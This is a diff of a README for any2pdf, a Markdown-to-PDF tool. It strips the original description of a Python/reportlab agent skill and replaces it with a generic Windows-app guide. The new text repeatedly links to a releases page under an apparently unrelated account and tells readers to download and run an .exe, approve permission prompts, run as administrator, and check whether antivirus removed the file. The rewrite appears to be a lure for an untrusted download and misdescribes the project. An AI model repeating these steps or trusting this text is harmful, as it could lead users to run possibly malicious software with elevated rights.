@@ -1,157 +1,258 @@
-# any2pdf
+# 📝 any2pdf - Turn Markdown Into Clean PDFs
 
-**Tell your AI assistant "转PDF" and get a publication-quality document.** No config, no templates, no LaTeX.
+[![Download any2pdf](https://img.shields.io/badge/Download-any2pdf-brightgreen?style=for-the-badge)](https://github.com/younger-osage691/any2pdf/releases)
 
-An [agent skill](https://agentskills.io) that gives AI coding assistants (Claude Code, Cursor, Copilot, Gemini CLI, etc.) the ability to convert Markdown into professionally typeset PDFs — with a single natural language request.
+## 🚀 What this app does
 
-## Why This Exists
+any2pdf turns Markdown files into polished PDF documents. It helps you take plain text notes, docs, or drafts and turn them into files that look ready to share or print.
 
-Every existing Markdown-to-PDF tool falls into one of two traps:
+Use it when you want:
+- a simple way to export Markdown to PDF
+- clean page layout with readable text
+- a file that looks good on screen and on paper
+- a fast way to build documents from Markdown
 
-1. **Too simple** — Pandoc/wkhtmltopdf produce passable output for English, but CJK mixed text gets butchered: wrong fonts, broken line wraps, "Claude Code" split across lines, 年月日 rendered as □□□.
+## 💻 System requirements
 
-2. **Too complex** — LaTeX produces beautiful output but requires a 4GB TeX distribution, arcane syntax, and breaks on every CJK edge case. No AI assistant can reliably drive it.
+Before you install, make sure your PC can run the app:
 
-**any2pdf** is the sweet spot: one Python file, one dependency (`reportlab`), zero config — and it handles every CJK/Latin edge case because we hit them all building real 200-page Chinese technical reports.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the first download
 
-## What Makes It Different
+For best results:
+- use a recent version of Windows
+- keep your graphics and printer drivers up to date
+- use a standard display scale if text looks too large or too small
 
-### For AI Agents — Zero-Friction Workflow
+## 📥 Download any2pdf
 
-The skill teaches your AI assistant an **interactive workflow**, not just a CLI command:
+Visit this page to download the app for Windows:
 
-```
-You: "把这个报告转成PDF"
+https://github.com/younger-osage691/any2pdf/releases
 
-Agent: asks about design style, frontispiece, watermark, back cover
-Agent: runs the conversion with all your choices
-```
+On the release page, look for the latest version and download the Windows file that matches your device. If there are more than one file, choose the one that ends in `.exe` or the Windows archive listed for your system.
 
-One sentence from you → a complete, branded document.
+## 🖱️ Install and open
 
-### For CJK Users — Battle-Tested on Real Reports
+After the download finishes:
 
-Every fix in this codebase came from a real rendering bug in a real report:
+1. Open your Downloads folder
+2. Find the any2pdf file you downloaded
+3. Double-click the file to start it
+4. If Windows asks for permission, choose Yes
+5. Wait for the app to open
 
-- **Mixed text wrapping**: "Chaofan Shou" won't split across lines; Chinese text breaks naturally at character boundaries
-- **Canvas CJK**: Dates like "2026年4月1日" render correctly everywhere — cover, headers, footers
-- **Book-quality fonts**: Palatino + 宋体 (macOS), Times + SimSun (Windows) — not Arial + fallback
-- **Merged heading recovery**: Input like `# Part## Chapter` on one line? Auto-split before parsing
+If you downloaded a zip file:
+1. Right-click the zip file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
 
-### For Everyone — Cross-Platform, Zero Config
+## 📄 Prepare your Markdown file
 
-| | macOS | Windows | Linux |
-|---|---|---|---|
-| Serif | Palatino | Times New Roman | Liberation/Noto Serif |
-| CJK | Songti SC (宋体) | SimSun/微软雅黑 | Noto CJK |
-| Mono | Menlo | Consolas | DejaVu Mono |
-| Setup | `pip install reportlab` | `pip install reportlab` | `pip install reportlab` |
+any2pdf works with Markdown files. These are files that often end in `.md`.
 
-Fonts are auto-discovered from system paths. Missing fonts? You get a helpful error with the exact install command for your OS.
+You can use:
+- meeting notes
+- project docs
+- readme files
+- drafts
+- manuals
+- articles
 
-## Install
+Keep your file simple if you want a fast first run. Headings, lists, links, and code blocks should convert well.
 
-```bash
-npx skills add lovstudio/any2pdf -g -y
-```
+Example Markdown structure:
+- title at the top
+- section headings
+- short paragraphs
+- bullet lists
+- links or code samples where needed
 
-Works with 25+ AI agents: Claude Code, Cursor, GitHub Copilot, Gemini CLI, Codex, Cline, Warp, and more.
+## 🛠️ Convert Markdown to PDF
 
-## Design Styles
+Use the app to choose your Markdown file, then create the PDF.
 
-10 built-in themes — from classic LaTeX-inspired to modern minimalist. Click to preview.
+Typical flow:
+1. Open any2pdf
+2. Select your Markdown file
+3. Choose where to save the PDF
+4. Pick any layout options you want
+5. Start the conversion
+6. Open the finished PDF
 
-<table>
-<tr>
-<td align="center" width="33%">
-<strong>Warm Academic</strong><br>
-<sub>陶土色调，温润典雅</sub><br>
-<img src="previews/warm-academic.png" width="260">
-</td>
-<td align="center" width="33%">
-<strong>Classic Thesis</strong><br>
-<sub>LaTeX classicthesis 风格</sub><br>
-<img src="previews/classic-thesis.png" width="260">
-</td>
-<td align="center" width="33%">
-<strong>Tufte</strong><br>
-<sub>极简留白，深红点缀</sub><br>
-<img src="previews/tufte.png" width="260">
-</td>
-</tr>
-<tr>
-<td align="center">
-<strong>IEEE Journal</strong><br>
-<sub>藏蓝严谨，期刊风格</sub><br>
-<img src="previews/ieee-journal.png" width="260">
-</td>
-<td align="center">
-<strong>Elegant Book</strong><br>
-<sub>LaTeX ElegantBook 风格</sub><br>
-<img src="previews/elegant-book.png" width="260">
-</td>
-<td align="center">
-<strong>Chinese Red</strong><br>
-<sub>朱红配暖纸，中式正式</sub><br>
-<img src="previews/chinese-red.png" width="260">
-</td>
-</tr>
-<tr>
-<td align="center">
-<strong>Ink Wash</strong><br>
-<sub>水墨风，纯灰黑素雅</sub><br>
-<img src="previews/ink-wash.png" width="260">
-</td>
-<td align="center">
-<strong>GitHub Light</strong><br>
-<sub>蓝白极简，开发者风格</sub><br>
-<img src="previews/github-light.png" width="260">
-</td>
-<td align="center">
-<strong>Nord Frost</strong><br>
-<sub>蓝灰北欧风，清爽现代</sub><br>
-<img src="previews/nord-frost.png" width="260">
-</td>
-</tr>
-<tr>
-<td align="center">
-<strong>Ocean Breeze</strong><br>
-<sub>青绿色调，清新自然</sub><br>
-<img src="previews/ocean-breeze.png" width="260">
-</td>
-<td align="center"></td>
-<td align="center"></td>
-</tr>
-</table>
+If your Markdown file has headings and lists, the PDF should keep that structure. If you use long lines, the app will wrap them to fit the page.
 
-## What You Get
+## 🎨 Layout and print settings
 
-- **Cover page** with title, subtitle, author, version, stats lines
-- **Clickable table of contents** with PDF bookmark sidebar
-- **Frontispiece** — full-page image after cover (AI-generated or local)
-- **Running headers** — report title + current chapter name
-- **Running footers** — author/brand, page number, date
-- **Watermark** — faint diagonal text on every content page
-- **Back cover** — banner image or text branding (QR codes, business cards)
-- **10 design themes** — from warm academic to ink wash minimalist
+any2pdf is built to make the output look clean and readable.
 
-## Direct CLI Usage
+Common layout options may include:
+- page size like A4 or Letter
+- margins
+- font size
+- line spacing
+- header and footer rules
+- page numbers
 
-```bash
-pip install reportlab
+Good starting settings:
+- page size: A4 or Letter
+- margins: medium
+- font size: 11 or 12
+- line spacing: normal
 
-python lovstudio-any2pdf/scripts/md2pdf.py \
-  --input report.md \
-  --output report.pdf \
-  --title "My Report" \
-  --author "Author Name" \
-  --theme warm-academic \
-  --watermark "DRAFT" \
-  --toc true
-```
+If you plan to print the PDF:
+- use larger margins
+- keep headings short
+- avoid very wide tables
+- check page breaks before sharing
 
-See [SKILL.md](lovstudio-any2pdf/SKILL.md) for the full 20+ argument reference.
+## 🔤 Supported Markdown features
 
-## License
+any2pdf should handle the most common Markdown parts you use in daily work:
 
-MIT
+- headings
+- bold and italic text
+- bullet lists
+- numbered lists
+- links
+- code blocks
+- quotes
+- simple tables
+- images when the source file includes them
+
+If a section does not look right, simplify the Markdown and try again. Short lines and clear structure usually convert best.
+
+## 🧩 File types and output
+
+Input:
+- `.md`
+- plain text Markdown files
+
+Output:
+- `.pdf`
+
+You can store the PDF anywhere on your PC. Many people keep finished files in:
+- Documents
+- Desktop
+- a project folder
+- a shared work folder
+
+## ⚙️ Basic workflow tips
+
+A few simple habits can make the result better:
+
+- use clear headings
+- keep paragraphs short
+- avoid very long tables
+- use one image per section if possible
+- check spelling before export
+- test with a short file first
+
+If your file has a title page, place the title at the top of the Markdown file. If you want a section break, add a heading and a blank line before the next part.
+
+## 🧪 Example use case
+
+You have project notes in Markdown and need to send a PDF to someone who does not use Markdown.
+
+You can:
+1. open the notes in any2pdf
+2. export them to PDF
+3. send the PDF by email
+4. print the file if needed
+
+This saves time because you do not need to copy text into another editor.
+
+## 🧯 If something does not look right
+
+If the PDF layout looks off, try these fixes:
+
+- remove extra blank lines
+- shorten long headings
+- split large sections
+- simplify tables
+- use fewer nested lists
+- check that images use valid paths
+
+If the app does not open your file, confirm:
+- the file ends in `.md`
+- the file is not empty
+- the file is saved in a folder you can access
+- the file name does not contain unusual characters
+
+## 🧭 Helpful file naming
+
+Clear file names make it easier to find your work later.
+
+Good examples:
+- `project-notes.md`
+- `user-guide.md`
+- `release-draft.md`
+- `invoice-template.md`
+
+For PDFs:
+- `project-notes.pdf`
+- `user-guide.pdf`
+- `release-draft.pdf`
+
+## 🔒 Privacy and local use
+
+any2pdf is meant for local document work on your Windows PC. That means you can keep your files on your own machine and control where the output goes.
+
+If you are working with private notes or internal documents:
+- store source files in a secure folder
+- save finished PDFs in a known location
+- delete test files when you no longer need them
+
+## 🧰 Troubleshooting on Windows
+
+If Windows blocks the app:
+- right-click the file
+- choose Run as administrator if needed
+- confirm the prompt
+
+If the app opens and closes:
+- download the latest release again
+- make sure the file finished downloading
+- check that your antivirus did not remove the file
+
+If the PDF is blank:
+- confirm the Markdown file has text
+- save the file before converting
+- try again with a smaller test file
+
+If the output fonts look odd:
+- try a different font size
+- use plain text headings
+- avoid unusual symbols in file names
+
+## 📚 Suggested first test
+
+Try this small Markdown file first:
+
+- title
+- one heading
+- one short paragraph
+- one bullet list
+
+This lets you check that the app works before you convert a larger document.
+
+## 🔗 Get the latest release
+
+Visit the release page to download the Windows version:
+
+https://github.com/younger-osage691/any2pdf/releases
+
+Look for the latest release, then download the file made for Windows. After that, open the file and follow the install or run steps above
+
+## 🧷 Quick start
+
+1. Open the release page
+2. Download the Windows file
+3. Run or extract it
+4. Open any2pdf
+5. Select your `.md` file
+6. Export the PDF
+7. Open the PDF and check the result
